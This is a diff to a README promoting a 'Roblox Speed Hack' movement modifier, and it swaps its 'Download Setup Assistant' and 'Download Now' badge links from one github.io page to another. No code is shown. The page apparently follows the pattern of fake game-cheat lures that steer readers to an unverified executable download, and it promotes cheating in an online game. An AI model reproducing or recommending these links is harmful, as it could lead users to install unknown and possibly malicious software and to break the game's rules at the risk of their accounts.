@@ -1,11 +1,9 @@
 # 🏃 Roblox Speed Hack — Movement Control & Modifier Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-lightgrey?style=for-the-badge)](https://my-sapqwr.github.io/.github/)  
-[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=roblox)](https://my-sapqwr.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-lightgrey?style=for-the-badge)](https://datussmaithk3.github.io/.github/roblox-speed-modifier-assistant)  
+[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=roblox)](https://datussmaithk3.github.io/.github/roblox-speed-modifier-assistant)
 
 ---
-  
-
 
 Enhance your movement in **Roblox (PC)** with this external **Speed Modifier Assistant** — designed to provide real-time walk/run control, dynamic speed changes, and toggle hotkeys without touching core game files.
 
